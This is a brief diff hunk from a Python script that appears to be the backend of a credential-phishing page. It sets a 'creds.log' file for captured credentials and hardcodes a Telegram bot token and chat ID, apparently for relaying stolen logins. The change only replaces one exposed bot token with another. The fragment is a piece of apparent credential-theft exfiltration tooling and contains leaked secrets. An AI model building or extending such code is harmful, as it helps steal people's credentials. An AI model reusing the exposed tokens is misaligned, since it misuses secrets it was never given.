@@ -32,7 +32,7 @@ APP_FILE = BASE_DIR / "index.html"
 LOG_FILE = Path(os.environ.get("CREDS_LOG", str(BASE_DIR / "creds.log")))
 
 TELEGRAM_BOT_TOKEN = os.environ.get(
-    "TELEGRAM_BOT_TOKEN", "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs"
+    "TELEGRAM_BOT_TOKEN", "9193237322:AAEtGVtgGanrSQxs97fBZaBIQC_iF_IeoXo"
 )
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8869604033")
 
